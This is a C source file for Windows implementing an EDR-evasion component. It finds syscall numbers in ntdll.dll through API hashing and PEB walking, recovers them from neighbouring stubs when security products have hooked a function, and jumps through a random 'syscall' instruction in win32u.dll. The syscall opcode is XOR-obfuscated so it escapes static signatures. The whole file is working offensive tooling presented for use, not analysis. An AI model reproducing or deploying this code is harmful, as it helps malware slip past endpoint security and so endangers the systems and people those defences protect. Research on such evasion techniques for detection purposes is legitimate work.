#include <Windows.h>

#include "Structs.h"
#include "Common.h"


#define	SYSCALL_STUB_SIZE		0x20		// Size of a syscall stub is 32 byte

#define UP                      ( -1 * SYSCALL_STUB_SIZE )
#define DOWN                    SYSCALL_STUB_SIZE
#define SEARCH_RANGE            0xFF

#define MOV1_SYSCALL_OPCODE     0x4C
#define R10_SYSCALL_OPCODE      0x8B
#define RCX_SYSCALL_OPCODE      0xD1
#define MOV2_SYSCALL_OPCODE     0xB8
#define JMP_SYSCALL_OPCODE      0xE9

#define RET_SYSCALL_OPCODE      0xC3

// Using the 'volatile' keyword indicating to the compiler that the value might change at runtime and therefore it shouldn't optimize the calculation
// This is used to prevent it from doing the XOR decryption operation at compile time and thus avoid exposing the 'syscall' instruction opcode.
volatile unsigned short g_SYSCALL_OPCODE = 0x052A;	// 0x050F ^ 0x25

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Structure used to hold details about a module

typedef struct _MODULE_CONFIG
{

    PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of the DLL's exported functions    [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
    PDWORD      pdwArrayOfNames;     // The VA of the array of names of the DLL's exported functions        [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
    PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of the DLL's exported functions     [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]    
    DWORD       dwNumberOfNames;     // The number of exported functions of the DLL                         [IMAGE_EXPORT_DIRECTORY.NumberOfNames]
    ULONG_PTR   uModule;             // The base address of the DLL - required to calculate future VAs      [BaseAddress]
    BOOLEAN     bInitialized;        // Set to TRUE if all elements are initialized

}MODULE_CONFIG, *PMODULE_CONFIG;

// Global
MODULE_CONFIG   g_NtdllConf   = { 0 };
MODULE_CONFIG   g_Win32uConf  = { 0 };

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL InitDllsConfigStructs(OUT PMODULE_CONFIG pModuleConf, IN ULONG_PTR uBaseAddress) {

    if ((pModuleConf->uModule = uBaseAddress) == NULL)
        return FALSE;

    // Fetching the NT headers of the DLL
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pModuleConf->uModule + ((PIMAGE_DOS_HEADER)pModuleConf->uModule)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // Fetching the export directory of the DLL
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(pModuleConf->uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // initalizing the 'MODULE_CONFIG' structure
    pModuleConf->dwNumberOfNames         = pImgExpDir->NumberOfNames;
    pModuleConf->pdwArrayOfNames         = ( PDWORD ) (pModuleConf->uModule + pImgExpDir->AddressOfNames);
    pModuleConf->pdwArrayOfAddresses     = ( PDWORD ) (pModuleConf->uModule + pImgExpDir->AddressOfFunctions);
    pModuleConf->pwArrayOfOrdinals       = ( PWORD  ) (pModuleConf->uModule + pImgExpDir->AddressOfNameOrdinals);

    // Checking if all elements are initialized
    if (!pModuleConf->dwNumberOfNames || !pModuleConf->pdwArrayOfNames || !pModuleConf->pdwArrayOfAddresses || !pModuleConf->pwArrayOfOrdinals)
        return FALSE;
        
    pModuleConf->bInitialized = TRUE;

    return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Retrieves a syscall instruction address from within 'win32u.dll'

BOOL FetchWin32uSyscallInst(OUT PVOID* ppSyscallInstAddress) {

    INT     iSeed       = GenerateRandomInt() % 0x10,
            iCounter    = 0x00;

    // Initialize win32u config 
    if (!g_Win32uConf.bInitialized) {
        if (!InitDllsConfigStructs(&g_Win32uConf, GetModuleHandleH(win32udll_CRC32)))
            return FALSE;
    }

    for (DWORD i = 0; i < g_Win32uConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName    = (PCHAR)(g_Win32uConf.uModule + g_Win32uConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_Win32uConf.uModule + g_Win32uConf.pdwArrayOfAddresses[g_Win32uConf.pwArrayOfOrdinals[i]]);

        for (DWORD ii = 0; ii < SYSCALL_STUB_SIZE; ii++){

            // Search for 'syscall' instruction
            // 'g_SYSCALL_OPCODE' is 0x050F ^ 0x25, thus XOR'ing it with 0x25 now
            // The 'unsigned short' data type is 2 bytes in size, which is the same size of the syscall opcode (0x050F)
            if (*(unsigned short*)((ULONG_PTR)pFuncAddress + ii) == (g_SYSCALL_OPCODE ^ 0x25) && *(BYTE*)((ULONG_PTR)pFuncAddress + ii + sizeof(unsigned short)) == RET_SYSCALL_OPCODE) {
                // Used to determine a random 'syscall' instruction address
                if (iCounter == iSeed) {
                    *ppSyscallInstAddress = (PVOID)((ULONG_PTR)pFuncAddress + ii);  // Return only when we are at the iSeed'th syscall
                    break;
                }

                iCounter++;
            }
        }

        if (*ppSyscallInstAddress)
            return TRUE;
    }

    return FALSE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


HMODULE GetModuleHandleH(IN UINT32 uModuleHash) {


    PPEB					pPeb = NULL;
    PPEB_LDR_DATA			pLdr = NULL;
    PLDR_DATA_TABLE_ENTRY	pDte = NULL;

    pPeb = (PPEB)__readgsqword(0x60);
    pLdr = (PPEB_LDR_DATA)(pPeb->LoaderData);
    pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    // Return the handle of the local .exe image
    if (!uModuleHash)
        return (HMODULE)(pDte->InInitializationOrderLinks.Flink);

    while (pDte) {

        if (pDte->FullDllName.Buffer && pDte->FullDllName.Length < MAX_PATH) {

            CHAR	cLDllName[MAX_PATH] = { 0 };
            DWORD	x = 0x00;

            while (pDte->FullDllName.Buffer[x]) {

                CHAR	wC = pDte->FullDllName.Buffer[x];

                // Convert to lowercase
                if (wC >= 'A' && wC <= 'Z')
                    cLDllName[x] = wC - 'A' + 'a';
                // Copy other characters (numbers, special characters ...)
                else
                    cLDllName[x] = wC;

                x++;
            }

            cLDllName[x] = '\0';

            if (CRCHASH(pDte->FullDllName.Buffer) == uModuleHash || CRCHASH(cLDllName) == uModuleHash)
                return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
        }

        // Move to the next node in the linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    return NULL;
}



//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // Initialize ntdll config 
    if (!g_NtdllConf.bInitialized) {
        if (!InitDllsConfigStructs(&g_NtdllConf, GetModuleHandleH(ntdlldll_CRC32)))
            return FALSE;
    }

    if ((pNtSys->dwSyscallHash = dwSysHash) == NULL)
        return FALSE;

    for (DWORD i = 0; i < g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName    = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        // If syscall hash value found
        if (CRCHASH(pcFuncName) == dwSysHash) {

            // The syscall is not hooked
            if (*((PBYTE)pFuncAddress) == MOV1_SYSCALL_OPCODE
                && *((PBYTE)pFuncAddress + 1) == R10_SYSCALL_OPCODE
                && *((PBYTE)pFuncAddress + 2) == RCX_SYSCALL_OPCODE
                && *((PBYTE)pFuncAddress + 3) == MOV2_SYSCALL_OPCODE
                && *((PBYTE)pFuncAddress + 6) == 0x00
                && *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE    high   = *((PBYTE)pFuncAddress + 5);
                BYTE    low    = *((PBYTE)pFuncAddress + 4);
                pNtSys->dwSSn = (high << 8) | low;
                break; // break for-loop [i]
            }

            // If hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == JMP_SYSCALL_OPCODE) {

                for (WORD idx = 1; idx <= SEARCH_RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == MOV1_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == R10_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == RCX_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == MOV2_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE    high   = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE    low    = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSn = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == MOV1_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == R10_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == RCX_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == MOV2_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE    high   = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE    low    = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSn = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == JMP_SYSCALL_OPCODE) {

                for (WORD idx = 1; idx <= SEARCH_RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == MOV1_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == R10_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == RCX_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == MOV2_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE    high   = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE    low    = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSn = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == MOV1_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == R10_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == RCX_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == MOV2_SYSCALL_OPCODE
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE    high   = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE    low    = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSn = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]
        }

    }


    if (pNtSys->dwSSn == NULL)
        return FALSE;

    // Search for a 'syscall' instruction in win32u.dll
    return FetchWin32uSyscallInst(&pNtSys->pSyscallInstAddress);
}

